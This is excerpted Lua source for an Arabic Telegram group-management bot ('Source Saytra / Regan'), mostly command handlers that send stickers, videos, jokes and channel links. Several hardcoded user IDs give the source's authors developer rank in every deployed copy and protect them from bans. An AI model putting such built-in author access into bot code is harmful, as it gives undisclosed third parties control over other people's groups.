...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n\27[0;33;49m')
...
io.write('\27[1;31m 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘"
exit 1
fi
if [ ! $token ]; then
echo "𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘"
...
token = sudos.token 
--- start functions 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,1967195297,188313077,1770739933,1763213425,188313077}   
...
if tonumber(user_id) == tonumber(1967195297) then  
var = true 
elseif tonumber(user_id) == tonumber(1763213425) then
var = true  
elseif tonumber(user_id) == tonumber(1770739933) then
var = true  
elseif tonumber(user_id) == tonumber(188313077) then
var = true  
elseif tonumber(user_id) == tonumber(188313077) then
var = true  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'ريجان') 
local DRAGON_Msg = { 
...
{{text = '《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》',url="t.me/s_aytra"}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text = ' 〠تم ارسال الملصق من 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n - '..Name
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/s_aytra/83/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' 〠 اصدار سورس ريجان{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطور السورس☎️', url="https://t.me/SAYTRA55"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/SAYTRA55&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ريجان ادخل وتابع الجديد](t.me/s_aytra)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》', url="t.me/s_aytra"}}, 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/s_aytra/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ريجان ادخل وتابع الجديد](t.me/s_aytra)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/s_aytra)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝المبرمج محمد ابراهيم لو حابب تتواصل معاه
اتبع الزر إلى تحت 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨𖣘• ⁽ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃₎ •𖣘❩', url="t.me/mo1ibrahim"}}, 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 〠 من أحسن السورسات على التليجرام سورس ريجان 〠
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "ريجان")
...
local Text =[[
╭━━━❲☆[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙰𝚈𝚃𝚁𝙰](t.me/s_aytra)☆❳━━━╮
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚃𝙴𝙰𝙼 𝚂𝙰𝚈𝚃𝚁𝙰](t.me/s_aytra)
[𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽❳ ❲𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼](t.me/s_aytra)
╰━━━❲☆[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙰𝚈𝚃𝚁𝙰](t.me/s_aytra)☆❳━━━╯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𝒔𝒂𝒚𝒕𝒓𝒂', url = "https://t.me/SAYTRA55"}},
{{text = 'ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ', url = "https://t.me/s_aytra"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'سيطره' or text == 'سيطرة' or text == 'مطور السورس'  then
local Text = [[
سيطره مطور سورس ريجان للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖣘• ⁽〠ՏᎪYͲᎡᎪ〠₎ •𖣘',url="t.me/SAYTRA55"}},
...
if text == 'سيطره' or text == 'مطور السورس' or text == 'مبرمج السورس' then
local Text = [[
لو حباب تتواصل مع عمو سيطره اتبع الزر الي تحت👇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐒𝐀𝐘𝐓𝐑𝐀',url="t.me/SAYTRA55"}},
{{text = '《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》',url="t.me/s_aytra"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SAYTRA55&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == '《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》' then
local Text = [[ 
 〠من أحسن السورسات على التليجرام سورس ريجان 〠
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙰𝚈𝚃𝚁𝙰](http://t.me/s_aytra)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》 ', url="t.me/s_aytra"}}, 
...
if text == '𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘' then
local Text = [[ 
 〠من أحسن السورسات على التليجرام سورس ريجان 〠
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/s_aytra/84&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
〠 روايات ← لعرض الميزه
〠 ثيم ← لعرض الميزه
〠 تصميم ريجان← لعرض الميزه
〠 غنيلي بفيديو← لعرض الميزه
〠 همسه ← لعرض الميزه
〠 معني + اسمك ← لعرض الميزه
〠 خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
〠 𝘾𝙃 - [《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》](t.me/s_aytra) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽𝑆𝐴𝑌𝑇𝑅𝐴₎ •𖣘 ❩', url="t.me/s_aytra"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/s_aytra/83/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العاب ريجان' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 〠 اهلا في قائمه الالعاب المتطوره سورس ريجان 〠 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/s_aytra)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if tonumber(result.sender_user_id_) == tonumber(1967195297) then  
send(msg.chat_id_, msg.id_, " 〠 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1763213425) then  
...
if tonumber(result.sender_user_id_) == tonumber(188313077) then  
...
if result.id_ == tonumber(1967195297) then
...
if result.id_ == tonumber(188313077) then
...
if tonumber(userid) == tonumber(1967195297) then  
send(msg.chat_id_, msg.id_, " 〠 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(188313077) then  
send(msg.chat_id_, msg.id_, " 〠 لا تسطيع حظر مالك السورس عام")
return false 
end
...
t = ' 〠 ملفات السورس ريجان𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅??𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if Get_info then
local TextS = "\n 〠 اهلا بك في متجر ملفات ريجان\n 〠 ملفات السورس 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n 〠 علامة تعني { ✔️ } ملف مفعل\n 〠 علامة تعني { ✖ } ملف معطل\n 〠 قناة سورس ريجان𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n".." 〠 [اضغط هنا لدخول](t.me/s_aytra) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," 〠 عذرا الملف لايدعم سورس ريجان\n") 
end
return false
end
...
if text == ("مسح قائمه ريجان") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 〠 تم مسح قائمه ريجان')
return false
end

if text == 'قائمه ريجان' and Sudo(msg) then
...
if text == ("رفع ريجان") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ريجان@(.*)$") and Sudo(msg) then
local username = text:match("^رفع ريجان@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ريجان(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ريجان(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل ريجان") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ريجان@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ريجان@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ريجان(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ريجان(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' 〠  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' 〠  الرفع  ⇇{ '..setadd..
' }\n'..' 〠  الحظر  ⇇{ '..banm..' }\n\n 〠═───═❲[《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》 ](t.me/s_aytra)❳═───═ 〠\n 〠 قناة سورس ريجان𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\n [ ❲[《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》 ](t.me/s_aytra)❳](t.me/s_aytra) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘ٴ\n 〠 ❲[《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》 ](t.me/s_aytra)❳ 〠 ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ريجان').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ريجان')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس ريجانو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/55/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/s_aytra/53/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/39/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'عاش' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/27/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'اجري' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/30/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'لا' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/34/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الو' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/41/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'حبك' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/13/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'ريجان غني' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/72/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'قمر' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/s_aytra/76/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/s_aytra/43/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'النشال' then
local Text = [[
]]
...
end --الكود حصري سورس ريجانيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ريجان').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..〠♥️](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/s_aytra)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤〠](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..〠💕](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/s_aytra)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..〠💕](t.me/s_aytra)')
return false
end
end
end
...
[[
🌨𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘Use ⇨ #username 🌨
🌨𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘iD ⇨ #id 🌨
🌨𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘Sta ⇨  #stast 🌨
🌨𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘Msg ⇨ #msgs 🌨
🌨𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 〠  
↑𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘𝙄𝘿 ➱ #id
↑𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘𝙍𝘼𝙉𝙆 ➱  #stast 〠  
↑𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘𝙈𝘼𝙎𝙂 ➱ #msgs 〠  
↑𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘𝗖𝗛 ➯  ↝@s_aytra↜ 〠  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
send(msg.chat_id_,msg.id_,'\n 〠 اهلا عزيزي البوت هنا ادمن'..'\n 〠 وصلاحياته هي 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘 \n━━━━━━━━━━'..'\n 〠 تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n 〠 مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n 〠 حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n 〠 دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n 〠 تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n 〠 اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
[🎯ألعاب سورس ريجان الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》 ](t.me/s_aytra)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘
 اختر الامر الذي تريدها .↑𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘
ده من الازرار بلاسفل . 𖣘━┅┄⟞⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧⟝┄┉━𖣘
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》 ](t.me/s_aytra)❳ 
]]
keyboard = {} 
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[《ѕᴏụʀᴄᴇ ѕᴀʏᴛʀᴀ》 ](t.me/s_aytra)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ريجان')
